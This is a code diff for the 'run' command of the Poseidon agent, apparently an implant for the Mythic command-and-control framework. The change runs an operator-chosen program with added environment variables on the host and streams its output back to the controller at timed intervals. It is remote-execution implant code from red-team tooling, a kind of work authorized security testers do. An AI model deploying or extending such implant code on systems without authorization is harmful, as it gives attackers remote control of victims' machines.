@@ -1,52 +1,127 @@
 package run
 
 import (
-	// Standard
-	"bytes"
+	"bufio"
+	"time"
+
 	"encoding/json"
 	"fmt"
+	"os"
 	"os/exec"
-
 	// Poseidon
 
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
 
 type runArgs struct {
-	Path string   `json:"path"`
-	Args []string `json:"args"`
+	Path        string   `json:"path"`
+	Args        []string `json:"args"`
+	Environment []string `json:"env"`
 }
 
-//Run - Function that executes the run command
+// Run - Function that executes the run command
 func Run(task structs.Task) {
-	msg := structs.Response{}
-	msg.TaskID = task.TaskID
+	msg := task.NewResponse()
 	args := runArgs{}
-	msg.TaskID = task.TaskID
 
-	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
+	err := json.Unmarshal([]byte(task.Params), &args)
+	if err != nil {
 		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters. Reason: %s", err.Error()))
 		task.Job.SendResponses <- msg
 		return
-	} else {
-		cmd := exec.Command(args.Path, args.Args...)
-		var out bytes.Buffer
-		cmd.Stdout = &out
-		cmd.Stderr = &out
-		if err := cmd.Run(); err != nil {
-			msg.Status = "error"
-			msg.Completed = true
-			msg.UserOutput += "\n" + err.Error()
-		} else {
-			msg.Completed = true
-			if out.String() == "" {
-				msg.UserOutput = "Command processed (no output)."
-			} else {
-				msg.UserOutput = out.String()
-			}
-		}
+	}
+	command := exec.Command(args.Path, args.Args...)
+	command.Env = os.Environ()
+	for _, val := range args.Environment {
+		command.Env = append(command.Env, val)
+	}
+	stdout, err := command.StdoutPipe()
+	if err != nil {
+		msg.SetError(err.Error())
+		task.Job.SendResponses <- msg
+		return
+	}
+	stderr, err := command.StderrPipe()
+	if err != nil {
+		msg.SetError(err.Error())
 		task.Job.SendResponses <- msg
 		return
 	}
 
+	stdoutScanner := bufio.NewScanner(stdout)
+	stderrScanner := bufio.NewScanner(stderr)
+	outputChannel := make(chan string, 1)
+	doneChannel := make(chan bool)
+	finishedReadingOutput := make(chan bool)
+	doneTimeDelayChannel := make(chan bool)
+	sendTimeDelayChannel := make(chan bool)
+	go func() {
+		bufferedOutput := ""
+		doneCount := 0
+		for {
+			select {
+			case <-doneChannel:
+				doneCount += 1
+				if doneCount == 2 {
+					msg = task.NewResponse()
+					msg.Completed = true
+					if bufferedOutput != "" {
+						msg.UserOutput = bufferedOutput
+					} else {
+						msg.UserOutput = fmt.Sprintf("No Output From Command")
+					}
+					task.Job.SendResponses <- msg
+					doneTimeDelayChannel <- true
+					finishedReadingOutput <- true
+					return
+				}
+			case newBufferedOutput := <-outputChannel:
+				bufferedOutput += newBufferedOutput
+			case <-sendTimeDelayChannel:
+				if bufferedOutput != "" {
+					msg = task.NewResponse()
+					msg.UserOutput = bufferedOutput
+					task.Job.SendResponses <- msg
+					bufferedOutput = ""
+				}
+			}
+		}
+	}()
+	go func() {
+		for stdoutScanner.Scan() {
+			outputChannel <- fmt.Sprintf("%s\n", stdoutScanner.Text())
+		}
+		doneChannel <- true
+	}()
+	go func() {
+		for stderrScanner.Scan() {
+			outputChannel <- fmt.Sprintf("%s\n", stderrScanner.Text())
+		}
+		doneChannel <- true
+	}()
+	go func() {
+		for {
+			select {
+			case <-doneTimeDelayChannel:
+				return
+			case <-time.After(5 * time.Second):
+				sendTimeDelayChannel <- true
+			}
+		}
+	}()
+	err = command.Start()
+	if err != nil {
+		msg.SetError(err.Error())
+		task.Job.SendResponses <- msg
+		return
+	}
+	// Need to finish reading stdout/stderr before calling .Wait()
+	<-finishedReadingOutput
+	err = command.Wait()
+	if err != nil {
+		msg.SetError(err.Error())
+		task.Job.SendResponses <- msg
+		return
+	}
+	return
 }
